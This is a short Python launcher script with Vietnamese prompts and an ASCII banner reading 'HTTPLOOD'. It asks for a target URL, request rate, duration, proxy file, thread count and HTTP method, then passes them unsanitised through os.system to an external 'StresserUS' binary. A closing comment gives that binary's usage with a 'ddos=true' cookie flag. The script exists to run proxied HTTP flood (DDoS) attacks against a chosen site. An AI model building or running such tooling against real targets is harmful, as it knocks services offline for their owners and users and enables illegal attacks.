import os
os.system("cls" if os.name == "nt" else "clear")
a='''
  @@@@@@ @@@@@@@ @@@@@@@  @@@@@@@@  @@@@@@  @@@@@@ @@@@@@@@ @@@@@@@  @@@  @@@  @@@@@@
 !@@       @@!   @@!  @@@ @@!      !@@     !@@     @@!      @@!  @@@ @@!  @@@ !@@    
  !@@!!    @!!   @!@!!@!  @!!!:!    !@@!!   !@@!!  @!!!:!   @!@!!@!  @!@  !@!  !@@!! 
     !:!   !!:   !!: :!!  !!:          !:!     !:! !!:      !!: :!!  !!:  !!!     !:!
 ::.: :     :     :   : : : :: ::: ::.: :  ::.: :  : :: :::  :   : :  :.:: :  ::.: : 
                                                                   HTTPLOOD - Đậu Đậu                                                                                          
	'''
print(a)
URL=input("  [+] Nhập URL Taget: ")
LIMIT=int(input("  [+] Nhập số limit (64): "))
TIME=int(input("  [+] Nhập Time (s): "))
LIST=input("  [+] Nhập file proxy (http.txt): ")
THREADS=(input("  [+] Nhập số luồng: "))
METHOD=input("  [+] Nhập method (GET, POST, HEAD): ")
print("=========================================")
print("  Đã gửi yêu cầu\n")
os.system(f"./StresserUS version=2 host={URL} limit={LIMIT} time={TIME} list={LIST} threads={THREADS} mode={METHOD}")
input()
#./StresserUS version=2 host=<url> limit=<rate> time=<time> list=<proxyfile> threads=<thread> mode=<GET/POST> cookie=<ddos=true> data=<post=true>
